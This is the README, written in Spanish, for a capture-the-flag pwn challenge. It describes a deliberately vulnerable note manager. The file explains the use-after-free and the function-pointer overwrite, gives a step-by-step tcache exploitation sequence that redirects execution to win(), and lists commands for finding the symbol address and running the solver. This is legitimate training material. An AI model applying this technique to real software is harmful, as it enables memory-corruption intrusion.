# HEAP Corp — Use-After-Free

| Campo       | Valor                                    |
|-------------|------------------------------------------|
| Categoría   | PWN                                      |
| Dificultad  | Difícil                                  |
| Técnica     | Use-After-Free + Function Pointer Overwrite |
| Docker      | Sí                                       |
| Puertos     | 9999 (nc), 80 (web)                      |

## Descripción

El gestor de notas `notectl` usa `malloc(64)` para cada nota. La nota tiene
esta estructura en memoria:

```
typedef struct {
    void (*fn)(void);   // 8 bytes — función a llamar al "leer"
    char  msg[56];      // 56 bytes — contenido
} Note;                 // total: 64 bytes
```

Al eliminar una nota, `free()` se llama pero el puntero **no se pone a NULL**.
Esto crea un *dangling pointer* — Use-After-Free.

## Vulnerabilidad

1. `cmd_del` libera el chunk pero deja `heap[s]` apuntando allí.
2. `cmd_edit` escribe desde el **inicio** del chunk (no desde `msg`), por lo
   que los primeros 8 bytes escritos **sobreescriben el function pointer `fn`**.
3. `cmd_read` llama `heap[s]->fn()` sin verificar si el slot fue liberado.

## Secuencia de explotación (tcache glibc)

```
new  slot 0  → malloc(64): chunk A en heap, fn=display
del  slot 0  → free(chunk A) → entra en tcache[64]; heap[0] = dangling
new  slot 1  → malloc(64): REUTILIZA chunk A (tcache); heap[1]=chunk A
               (heap[0] y heap[1] apuntan al MISMO chunk)
edit slot 0  → write(chunk A, p64(win_addr) + b'\x00'*56)
               → heap[1]->fn ahora apunta a win()
read slot 1  → heap[1]->fn() == win() → flag!
```

## Obtener la dirección de win()

```bash
objdump -d notectl | grep -A2 '<win>'
# o con pwntools:
python3 -c "from pwn import ELF; e=ELF('./notectl'); print(hex(e.symbols['win']))"
```

## Solución rápida

```bash
python3 solve.py REMOTE <host> <port_9999>
```

## Cómo ejecutar

```bash
FLAG="CTF{test_flag}" docker compose up --build
```
